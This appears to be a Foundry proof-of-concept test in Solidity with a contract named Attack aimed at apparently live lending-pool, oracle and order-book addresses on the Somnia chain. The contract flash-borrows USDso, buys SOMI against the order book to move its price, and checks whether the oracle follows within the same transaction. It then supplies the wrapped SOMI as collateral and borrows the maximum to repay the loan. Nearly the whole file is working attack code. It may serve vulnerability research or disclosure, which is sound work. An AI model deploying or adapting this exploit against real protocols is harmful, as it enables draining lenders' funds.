// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address, uint256) external returns (bool);
}

interface IWrappedNative {
    function deposit() external payable;
}

interface IAaveOracle {
    function getAssetPrice(address) external view returns (uint256);
    function getSourceOfAsset(address) external view returns (address);
    function BASE_CURRENCY_UNIT() external view returns (uint256);
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);
}

interface IPool {
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
    function supply(address, uint256, address, uint16) external;
    function borrow(address, uint256, uint256, uint16, address) external;
    function getConfiguration(address) external view returns (uint256);
    function getUserAccountData(address)
        external
        view
        returns (uint256 collateral, uint256 debt, uint256 available, uint256 liqThreshold, uint256 ltv, uint256 hf);
}

interface IClob {
    struct Level { uint256 price; uint256 quantity; }
    function getPoolParams() external view returns (address, address, uint256, uint256, uint256, uint256, uint256);
    function getBookLevels(bool isBid, uint64 n) external view returns (Level[] memory);
    function getAutoPullRequirement(address, bool, uint256, uint256, uint96)
        external view returns (address, uint256, uint256);
    function placeOrder(bool, uint64, uint256, uint256, uint64, uint8, uint8, address, uint96)
        external payable returns (bool, uint128);
}

/// @notice Zero-seed: flash USDso -> IOC buy SOMI on dreamDEX -> wrap -> supply WSOMI ->
///         borrow max USDso -> repay the flash, all inside one transaction.
contract Attack {
    address constant POOL   = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address constant WSOMI  = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address constant USDSO  = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address constant NATIVE = 0x28f34DeFd2b4CB48d9eE6d89f2Be4Bc601694c00;
    address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;

    uint256 constant BPS = 10_000;
    uint256 constant BPS_ = 10_000;
    uint8 constant IOC = 2;
    uint8 constant SELF_CANCEL_TAKER = 0;

    address public immutable owner = msg.sender;

    uint256 public flashAmount;
    uint256 public repayment;
    uint256 public limitBps_;

    uint256 public oracleBefore;
    uint256 public oracleAfter;
    uint256 public askBefore;
    uint256 public askAfter;
    uint256 public bidBefore;
    uint256 public bidAfter;
    uint256 public somiBought;
    uint256 public usdsoSpent;
    uint256 public execPrice;
    uint256 public supplied;
    uint256 public ltvBps;
    uint256 public borrowPowerBase;
    uint256 public borrowedUsdso;
    int256  public netBase;
    uint256 public leftoverUsdso;
    uint256 public somiLtvBps;
    bool    public repaid;

    error Shortfall(uint256 need, uint256 have);

    function run(uint256 amount, uint256 limitBps) external {
        require(msg.sender == owner, "owner");
        flashAmount = amount;
        limitBps_ = limitBps;
        repayment = amount + (amount * IPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / BPS;

        oracleBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        bidBefore = _best(true);
        askBefore = _best(false);

        IPool(POOL).flashLoanSimple(address(this), USDSO, amount, "", 0);

        repaid = true;
        leftoverUsdso = IERC20(USDSO).balanceOf(address(this));
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external returns (bool)
    {
        require(msg.sender == POOL && initiator == address(this), "only pool");
        require(asset == USDSO && amount == flashAmount && premium == repayment - flashAmount, "bad flash");

        // ---- 1. real IOC buy of native SOMI against the live ask book ----
        (,,,, uint256 tick, uint256 minQty, uint256 lot) = IClob(MARKET).getPoolParams();
        uint256 ask = askBefore;
        uint256 limit = ((ask * limitBps_) / BPS_ / tick) * tick + tick;
        uint256 qty = _sizeBuy(limit, amount, lot);
        require(qty >= minQty, "qty below min");

        (address input, uint256 required,) =
            IClob(MARKET).getAutoPullRequirement(address(this), true, limit, qty, 0);
        require(input == USDSO && required <= amount, "pull requirement");
        IERC20(USDSO).approve(MARKET, required);

        uint256 nativeBefore = address(this).balance;
        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
        (bool ok,) = IClob(MARKET).placeOrder(
            true, 0, limit, qty, uint64((block.timestamp + 300) * 1e9), IOC, SELF_CANCEL_TAKER, address(0), 0
        );
        require(ok, "order rejected");
        somiBought = address(this).balance - nativeBefore;
        usdsoSpent = quoteBefore - IERC20(USDSO).balanceOf(address(this));
        require(somiBought > 0 && usdsoSpent > 0, "no fill");
        execPrice = (usdsoSpent * 1e18) / somiBought;

        // ---- 2. same-transaction oracle reread, after the trade ----
        oracleAfter = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        askAfter = _best(false);
        bidAfter = _best(true);

        // ---- 3. wrap and supply the acquired collateral ----
        IWrappedNative(WSOMI).deposit{value: somiBought}();
        supplied = somiBought;
        IERC20(WSOMI).approve(POOL, somiBought);
        IPool(POOL).supply(WSOMI, somiBought, address(this), 0);
        ltvBps = IPool(POOL).getConfiguration(WSOMI) & 0xffff;
        somiLtvBps = ltvBps;

        (,, uint256 available,,,) = IPool(POOL).getUserAccountData(address(this));
        borrowPowerBase = available;

        // ---- 4. borrow the maximum of the reserve the flash must be repaid in ----
        uint256 price = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        uint256 budget = available - (available / 1_000_000) - 1; // HF guard epsilon
        borrowedUsdso = (budget * 1e18) / price;
        if (borrowedUsdso > 0) IPool(POOL).borrow(USDSO, borrowedUsdso, 2, 0, address(this));

        // ---- 5. hand the flash back, or record exactly how short we are ----
        uint256 have = IERC20(USDSO).balanceOf(address(this));
        if (have < repayment) revert Shortfall(repayment, have);
        IERC20(USDSO).approve(POOL, repayment);
        return true;
    }

    function _best(bool isBid) internal view returns (uint256) {
        IClob.Level[] memory l = IClob(MARKET).getBookLevels(isBid, 1);
        return l.length == 0 ? 0 : l[0].price;
    }

    function _sizeBuy(uint256 limit, uint256 budget, uint256 lot) internal view returns (uint256 q) {
        IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 50);
        uint256 spent;
        for (uint256 i; i < asks.length; ++i) {
            if (asks[i].price == 0 || asks[i].price > limit) break;
            uint256 cost = (asks[i].price * asks[i].quantity) / 1e18;
            if (spent + cost <= budget) { q += asks[i].quantity; spent += cost; }
            else { q += ((budget - spent) * 1e18) / asks[i].price; break; }
        }
        q = (q / lot) * lot;
        for (uint256 i; i < 4 && q > 0; ++i) {
            (, uint256 req,) = IClob(MARKET).getAutoPullRequirement(address(this), true, limit, q, 0);
            if (req <= budget) return q;
            q = ((q * budget) / req / lot) * lot;
        }
        return 0;
    }

    receive() external payable {}
}

contract SomniaPoC is Test {

    address constant POOL   = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address constant WSOMI  = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address constant USDC   = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
    address constant USDSO  = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;

    /// @dev The fork comes from the command line (run-fork.sh), not from here. That keeps the
    ///      pinned block in one place and avoids double-forking.
    function setUp() public {
        require(block.chainid == 5031, "not Somnia: pass --fork-url and --fork-block-number");
        require(block.number > 0, "no forked block");
    }

    /// @notice Run this one. Prints the whole case at the pinned block.
    function test_attack() public {
        console2.log("block", block.number);
        console2.log("premium bps", IPool(POOL).FLASHLOAN_PREMIUM_TOTAL());

        // --- the gate every flash-loaned round trip must clear ---
        uint256 somiLtv = IPool(POOL).getConfiguration(WSOMI) & 0xffff;
        uint256 usdsoLtv = IPool(POOL).getConfiguration(USDSO) & 0xffff;
        uint256 prem = IPool(POOL).FLASHLOAN_PREMIUM_TOTAL();
        console2.log("SOMI ltv bps", somiLtv);
        console2.log("SOMI edge required bps", ((BPS_ + prem) * BPS_) / somiLtv - BPS_);
        console2.log("USDso ltv bps", usdsoLtv);
        console2.log("USDso edge required bps", ((BPS_ + prem) * BPS_) / usdsoLtv - BPS_);

        // --- depth: how much it takes to walk the ask book ---
        IClob.Level[] memory deep = IClob(MARKET).getBookLevels(false, 20);
        if (deep.length > 0) {
            uint256 notional;
            for (uint256 i; i < deep.length; ++i) notional += (deep[i].price * deep[i].quantity) / 1e18;
            console2.log("20-level ask walk: worst", deep[deep.length - 1].price);
            console2.log("  cumulative USDso", notional);
        }

        // --- the attack ---
        Attack a = new Attack();
        uint256 amount = vm.envOr("FLASH_USDSO", uint256(1_000e18));
        try a.run(amount, vm.envOr("LIMIT_BPS", uint256(10_050))) {
            console2.log("REPAID");
        } catch (bytes memory err) {
            if (err.length == 68) {
                (uint256 need, uint256 have) = abi.decode(_body(err), (uint256, uint256));
                console2.log("SHORTFALL need", need);
                console2.log("SHORTFALL have", have);
            } else {
                console2.log("reverted");
            }
        }

        console2.log("oracle before", a.oracleBefore());
        console2.log("oracle after ", a.oracleAfter());
        console2.log("ORACLE MOVE BPS", _move(a.oracleBefore(), a.oracleAfter()));
        console2.log("ask before/after", a.askBefore(), a.askAfter());
        console2.log("ASK MOVE BPS", _move(a.askBefore(), a.askAfter()));
        console2.log("bid before/after", a.bidBefore(), a.bidAfter());
        console2.log("SOMI bought", a.somiBought());
        console2.log("USDso spent", a.usdsoSpent());
        console2.log("realized exec price", a.execPrice());
        console2.log("supplied", a.supplied());
        console2.log("borrow power base", a.borrowPowerBase());
        console2.log("borrowed USDso", a.borrowedUsdso());
        console2.log("repayment required", a.repayment());
        console2.log("repaid", a.repaid());
        console2.log("leftover USDso", a.leftoverUsdso());
    }

    uint256 constant BPS_ = 10_000;

    function _body(bytes memory err) internal pure returns (bytes memory out) {
        out = new bytes(err.length - 4);
        for (uint256 i; i < out.length; ++i) out[i] = err[i + 4];
    }

    function _move(uint256 before_, uint256 after_) internal pure returns (uint256) {
        if (before_ == 0 || after_ <= before_) return 0;
        return ((after_ - before_) * 10_000) / before_;
    }
}
